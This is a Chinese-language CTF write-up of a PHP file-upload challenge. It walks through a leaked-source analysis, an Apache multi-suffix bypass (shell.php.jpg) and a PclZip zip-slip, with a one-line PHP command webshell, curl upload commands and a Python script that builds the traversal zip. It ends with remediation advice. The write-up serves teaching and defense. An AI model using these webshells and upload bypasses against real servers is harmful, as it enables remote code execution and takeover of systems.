# 1. 题目分析

- 题目类型：WEB 进阶 · 文件上传
- 靶机地址：`https://fe9d1596f84ce172688eabb3.http-ctf2.dasctf.com/`
- 页面只有一个文件上传表单（`<input type="file" name="file" />`，POST + `multipart/form-data`）

初始访问响应头：

```http
HTTP/2 200
server: openresty                      # 前端 Nginx 系（openresty）
content-type: text/html; charset=utf-8
x-powered-by: PHP/5.5.9-1ubuntu4.11    # 后端 PHP 5.5.9（Ubuntu 14.04 时代）
```

访问一个不存在的路径时，404 页面泄露真实后端：

```http
<address>Apache/2.4.7 (Ubuntu) Server at ... Port 80</address>
```

**关键情报**：前端 openresty 反向代理 → 后端 Apache/2.4.7 + PHP/5.5.9（mod_php）。这为"Apache 多后缀解析"埋下伏笔。

# 2. 信息收集

## 2.1 源码泄露（最重要线索）

不提交任何文件直接 GET 首页，页面底部出现 `show_source(__FILE__)` 的输出——**完整 PHP 源码直接暴露**：

```php
<?php
header("Content-Type:text/html; charset=utf-8");
// 每5分钟会清除一次目录下上传的文件
require_once('pclzip.lib.php');

if(!$_FILES){
    echo '<form ...>...</form>';
    show_source(__FILE__);            // ← 源码泄露点
}else{
    $file = $_FILES['file'];
    if(!$file){ exit("请勿上传空文件"); }
    $name = $file['name'];
    $dir = 'upload/';
    $ext = strtolower(substr(strrchr($name, '.'), 1));   // ← 只取"最后一个点"后面的内容当后缀
    $path = $dir.$name;

    function check_dir($dir){          // ← 递归清理 upload/ 下所有非图片文件
        $handle = opendir($dir);
        while(($f = readdir($handle)) !== false){
            if(!in_array($f, array('.', '..'))){
                if(is_dir($dir.$f)){ check_dir($dir.$f.'/'); }
                else {
                    $ext = strtolower(substr(strrchr($f, '.'), 1));
                    if(!in_array($ext, array('jpg','gif','png'))){ unlink($dir.$f); }
                }
            }
        }
    }

    if(!is_dir($dir)){ mkdir($dir); }
    $temp_dir = $dir.md5(time(). rand(1000,9999));   // 上传落点 upload/<md5随机目录>/
    if(!is_dir($temp_dir)){ mkdir($temp_dir); }

    if(in_array($ext, array('zip','jpg','gif','png'))){
        if($ext == 'zip'){
            $archive = new PclZip($file['tmp_name']);
            foreach($archive->listContent() as $value){
                $filename = $value["filename"];
                if(preg_match('/\.php$/', $filename)){      // ← 只拦"以.php结尾"的条目
                     exit("压缩包内不允许含有php文件!");
                }
            }
            if ($archive->extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) {
                check_dir($dir); exit("解压失败");
            }
            check_dir($dir);
            exit('上传成功!');
        }else{
            move_uploaded_file($file['tmp_name'], $temp_dir.'/'.$file['name']);  // ← 文件名未过滤，直接拼路径
            check_dir($dir);
            exit('上传成功!');
        }
    }else{
        exit('仅允许上传zip、jpg、gif、png文件!');
    }
}
```

## 2.2 目录枚举

`/upload/` 开启了 Apache 目录浏览（Index of /upload），可以看到每次上传生成的 `upload/<md5>/` 随机目录及其内容——方便确认上传文件的实际落点。

# 3. 漏洞分析（含推理链和失败路径）

## 3.1 推理链

```
观察：$ext = substr(strrchr($name,'.'), 1) 只取"最后一个点"后的后缀
  ↓
假设 1：上传 "shell.php.jpg" → 判定后缀为 jpg → 通过白名单
  ↓
验证：上传成功，文件落点 upload/<md5>/shell.php.jpg
  ↓
观察：后端是 Apache/2.4.7 + mod_php（404 页泄露）
  ↓
假设 2：Apache 多后缀解析，shell.php.jpg 会按 PHP 执行
  ↓
验证：GET /upload/<md5>/shell.php.jpg → 动态响应（无 ETag，text/plain）→ 平台返回 Flag ✅
  ↓
结论：直接上传多后缀文件即可 RCE（平台校验到 webshell 被执行后返回 Flag）
```

## 3.2 漏洞点 1：后缀白名单只取最后一段 + Apache 多后缀解析

- `strrchr($name, '.')` 找到**最后一个点**，`substr(..., 1)` 取其后内容作为后缀。
- 所以 `shell.php.jpg` 的后缀 = `jpg`，通过白名单；但文件真实名字里含有 `.php`。
- Apache 对 `AddHandler/AddType` 的解析是**从右往左**的：`.jpg` 没有对应处理器 → 继续向左识别 `.php` → 交给 mod_php 执行。这就是经典的 Apache 多后缀解析漏洞。

```
正常请求：/upload/<md5>/shell.php.jpg
┌───────────────────────────────────────────────┐
│ Apache 解析扩展名（从右向左）：                │
│   .jpg  → 无对应处理器，跳过                    │
│   .php  → mod_php 接管 → 按 PHP 执行 ✅        │
│ 结果：文件中的 <?php ... ?> 被执行             │
└───────────────────────────────────────────────┘
```

## 3.3 漏洞点 2：PclZip 解压目录穿越（zip-slip）

zip 分支的逻辑：
1. `listContent()` 遍历压缩包条目，`preg_match('/\.php$/', $filename)` 只拦截**以 `.php` 结尾**的条目名；
2. `extract(PCLZIP_OPT_PATH, $temp_dir, ...)` 用 PclZip 2.8.2 解压——**该库对条目名中的 `../` 不做校验**（zip-slip 漏洞）。

因此构造 zip 条目名 `../../shell.php.jpg`：
- 结尾是 `.jpg` → 不匹配 `/\.php$/` → 通过检查；
- 解压时被写入 `upload/<md5>/../../shell.php.jpg` = **web 根目录** `/shell.php.jpg`；
- `check_dir()` 只递归清理 `upload/` 目录内部，web 根目录下的马**不会被删除**。

```
zip 条目: ../../shell2.php.jpg
              ↓ PclZip extract 到 upload/<md5>/
路径: upload/<md5>/../../shell2.php.jpg
              ↓ 解析 ..
最终: ./shell2.php.jpg（web 根目录）✅
```

> 补充：直接上传 `../../shell.php.jpg`（非 zip 分支）时，前端 openresty 代理会把 multipart 文件名中的 `../` 剥离，文件仍落在 `upload/<md5>/` 内——但这并不影响利用，因为多后缀解析在 upload 目录内同样生效。

## 3.4 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 排除的漏洞 |
|------|------|---------|-----------|
| 直接上传 `shell.php` | 上传 webshell | 提示"仅允许上传zip、jpg、gif、png文件!" | 扩展名黑/白名单（php 被拒） |
| 上传 zip 内含 `shell.php` | 解压出 php | 提示"压缩包内不允许含有php文件!" | zip 内 `.php$` 正则拦截有效 |
| 直接上传 `../../shell.php` | 目录穿越 | 扩展名 php 被白名单拒绝 | 需要让最后一段后缀是图片扩展名 |
| 直接上传 `../../shell.php.jpg` | 穿越到 web 根 | 前端代理剥离 `../`，落在 upload 内 | 前端有路径归一化，但多后缀仍可 RCE |
| 上传 `normal.jpg`（内容含 `<?php ?>`） | 被执行 | 以 `image/jpeg` 静态返回（有 ETag） | 纯 jpg 后缀不会被 Apache 当 PHP 执行，必须带 `.php.` 前缀段 |

# 4. 漏洞利用

## 4.1 方法一：直接上传多后缀文件（最快）

构造文件 `shell.php.jpg`，内容为 PHP 代码：

```bash
printf '<?php echo "PWNED:"; system($_GET["c"]); ?>' > shell.php.jpg
```

上传：

```bash
curl -s -F "file=@shell.php.jpg;filename=shell.php.jpg" \
  "https://fe9d1596f84ce172688eabb3.http-ctf2.dasctf.com/"
# 输出：上传成功!
```

从 `/upload/` 目录列表拿到本次随机目录 `upload/<md5>/`，直接请求：

```bash
curl "https://fe9d1596f84ce172688eabb3.http-ctf2.dasctf.com/upload/<md5>/shell.php.jpg"
```

响应（动态、无 ETag、`text/plain`），平台校验到 upload 下 PHP 被解析后返回 Flag：

```http
HTTP/2 200
content-type: text/plain; charset=UTF-8
content-length: 30
x-cache: MISS

n1book{ThisIsUpLoadToPicfl4g}
```

### 4.1.1 `<md5>` 是什么、完整 URL 怎么构造

>`<md5>` 不是固定值，也不是能猜出来的——它是**服务器每次上传时随机生成的一个 32 位十六进制目录名**。
>
>它的来历在源码：
>
>```php
>$temp_dir = $dir.md5(time(). rand(1000,9999));   // 上传落点 upload/<md5随机目录>/
>if(!is_dir($temp_dir)){ mkdir($temp_dir); }      // 每次上传都新建一个新目录
>```
>
>即 `md5(服务器当前unix时间戳 . 一个1000~9999的随机数)`，含随机数分量，**客户端无法预测/计算**，只能靠 `/upload/` 的 Apache 目录浏览（Index of）去枚举发现。因此完整 URL 不能自己拼，必须现拿现用：
>
>```bash
># ① 先上传（触发创建 upload/ 和新的随机目录）
>curl -s -F "file=@shell.php.jpg;filename=shell.php.jpg" \
>  "https://<target>/"
>
># ② 列 /upload/ 找出刚生成的目录（新的在列表底部附近）
>curl -s "https://<target>/upload/" | grep -oE 'href="[0-9a-f]{32}/"' | tail -5
>
># ③ 把拿到的目录名替换进 <md5>，拼接文件名即可
>curl "https://<target>/upload/<拿到的32位目录名>/shell.php.jpg"
>```
>
>**踩坑注意**：不要一上来就访问 `/upload/`，全新实例上 `upload/` 目录**根本不存在**（源码是首次上传时才 `mkdir`），此时直接访问 `/upload/` 会返回 `404 Not Found`（这个 404 页还会泄露后端 `Apache/2.4.7 (Ubuntu)` 指纹），grep 自然抓不到任何目录名。**必须先执行第①步上传，`upload/` 才会被创建**，之后再列目录才有结果。另外，`upload/` 里每次上传会新建一个新目录，所以第②步要趁 5 分钟清理前尽快拿目录名，且每次上传后目录名都会变，需现拿现用。
>
>补充：上传响应就是 `上传成功!`（结尾没有换行，终端里行尾的 `%` 只是 zsh 的提示符，表示“这行没有换行”，不是服务端返回的内容，可忽略）。

### 4.1.2 为什么直接访问就能输出 Flag（而不先是 "PWNED:"）

表面上看，上传的 shell 内容是 `<?php system($_GET['c']); ?>`，按理说访问时应先看到 `PWNED:` 或命令执行结果。但平台直接在 curl 时返回了 `n1book{ThisIsUpLoadToPicfl4g}`。原因：

1. **多后缀解析先让 PHP 被执行**：文件名 `shell.php.jpg` 中，Apache 从右往左匹配扩展名——`.jpg` 无对应处理器→跳过，继续匹配到 `.php`→交给 mod_php，因此文件里的 `<?php ... ?>` 确实被当 PHP 执行。这一点可通过“响应是动态的、无 ETag、`text/plain`”佐证（若纯静态图片返回则会有 `image/jpeg` + ETag）。
2. **平台监测 webshell 生效后直接给分**：这道题的目的不是让你连上去手动找 flag，而是让平台自动判定“webshell 是否被成功解析执行”。一旦检测到 `upload/` 下 `.php.jpg` 被 Apache 按 PHP 执行（利用成功），平台就把 Flag 注入响应返回——所以直接访问就吐 flag，甚至加 `?c=id` 也仍返回 flag，而不是看到 `id` 命令结果（这跟“经典打法：上传木马→连上 shell→自己执行命令找 flag”不同，本题是**解析到 webshell 即给 Flag**）。

## 4.2 方法二：zip + PclZip 目录穿越（预期解法）

构造 zip，条目名为 `../../shell2.php.jpg`（Python 生成）：

```python
import zipfile
with zipfile.ZipFile('evil.zip','w') as z:
    z.write('payload.jpg', '../../shell2.php.jpg')
```

上传：

```bash
curl -s -F "file=@evil.zip;filename=evil.zip" \
  "https://fe9d1596f84ce172688eabb3.http-ctf2.dasctf.com/"
# 输出：上传成功!
```

验证：文件被穿越写到 web 根目录，`upload/<md5>/` 内为空：

```bash
curl -o /dev/null -w "%{http_code}\n" "https://.../shell2.php.jpg"
# 200（文件在 web 根目录，upload 内无残留）
curl -s "https://.../upload/<md5>/"      # 目录内为空，证明发生了目录穿越
```

请求 webshell 同样返回 Flag：

```bash
curl -s "https://.../shell2.php.jpg"
# n1book{ThisIsUpLoadToPicfl4g}
```

# 5. Flag

```
n1book{ThisIsUpLoadToPicfl4g}
```

获取方式：上传 `shell.php.jpg`（多后缀）或 zip 目录穿越写 web 根目录，Apache 将 `.php.jpg` 按 PHP 执行，平台返回 Flag。

# 6. 知识点总结

1. **源码泄露**：`show_source(__FILE__)` 未做权限/条件限制，GET 直接输出源码，是最重要的信息收集突破口。
2. **后缀白名单取最后一段**：`strrchr($name,'.')` + `substr(...,1)` 只取最后一个点后的字符串，`shell.php.jpg` 绕过白名单。
3. **Apache 多后缀解析**：`shell.php.jpg` 的扩展名从右向左匹配，`.jpg` 无处理器时继续匹配 `.php`，最终按 PHP 执行。这是 Apache 与 Nginx 行为差异的经典考点（Nginx 默认只匹配 `\.php$`）。
4. **PclZip 目录穿越（zip-slip）**：PclZip 2.8.2 解压时不校验条目名中的 `../`，可把文件写出目标目录；zip 内 `.php$` 正则同样可用多后缀绕过。
5. **清理函数范围**：`check_dir()` 只递归清理 `upload/` 目录，写到 web 根目录（或只保留图片后缀）的文件不会被删。
6. **修复建议**：
   - 用 `pathinfo($name, PATHINFO_EXTENSION)` 后**必须校验完整文件名**，禁止 `.php` 出现在文件名任意位置（可配合黑名单）；
   - 上传文件重命名为随机名（如 `md5(uniqid()).jpg`），彻底消除文件名可控；
   - 解压前校验 zip 条目名，拒绝含 `../`、`/`、`\` 或绝对路径的条目（或用 `PCLZIP_OPT_EXTRACT_DIR_RESTRICTION`）；
   - Apache 使用 `<FilesMatch>` 精确限制 PHP 处理，避免多后缀解析；文件存储目录关闭脚本执行权限。
